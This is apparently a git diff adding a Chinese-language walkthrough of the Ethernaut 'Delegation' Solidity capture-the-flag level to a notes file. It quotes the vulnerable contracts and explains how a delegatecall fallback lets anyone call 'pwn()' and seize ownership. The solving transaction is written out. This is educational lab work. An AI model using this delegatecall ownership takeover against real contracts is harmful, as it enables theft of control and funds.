@@ -128,7 +128,7 @@ contract Fallback {
     ```js
     >> await contract.send(1)
     // 或
-    >> await contract.sendTransaction({value:1})
+    >> await contract.sendTransaction({value:1})  // 发起一个交易
 
     >> await contract.owner()
     ```
@@ -429,3 +429,63 @@ contract Token {
 // 转给自己的话，就先下溢出再上溢出了...
 >> await contract.transfer(<address>, 21)
 ```
+
+## 6. Delegation
+
+声明对合约实例的所有权
+
+```js
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+contract Delegate {
+
+  address public owner;
+
+  constructor(address _owner) public {
+    owner = _owner;
+  }
+
+  function pwn() public {
+    owner = msg.sender;
+  }
+}
+
+contract Delegation {
+
+  address public owner;
+  Delegate delegate;
+
+  constructor(address _delegateAddress) public {
+    delegate = Delegate(_delegateAddress);
+    owner = msg.sender;
+  }
+
+  // 没有 payable，不能使用转账来触发 fallback
+  // 同时，通过转账来触发 fallback 函数不能加任何 data
+  fallback() external {
+    (bool result,) = address(delegate).delegatecall(msg.data);
+    if (result) {
+      this;
+    }
+  }
+}
+```
+
+- 代理调用只使用给定地址的代码，其他属性都取自当前合约
+- 使用合约 `Delegate` 的 `pwn` 函数来修改合约 `Delegation` 的所有者
+- 除了向合约转账会触发 `fallback` 函数外，若被调用的函数不存在同样会触发
+- 调用 `Delegation` 不存在的函数 `pwn` 来触发 `fallback` 函数，从而执行真正的 `pwn` 函数
+  
+    ```js
+    // keccak256 即 sha3
+    >> await contract.sendTransaction({data: web3.utils.sha3("pwn()")})
+    >> await contract.owner()
+    ```
+
+- 代理调用功能强大且危险，慎用 👀
+
+### 参考资料
+
+- [SHA-3 - 维基百科，自由的百科全书](https://zh.wikipedia.org/wiki/SHA-3)
+- [sha3](https://web3js.readthedocs.io/en/v1.7.0/web3-utils.html?highlight=sha3#sha3)
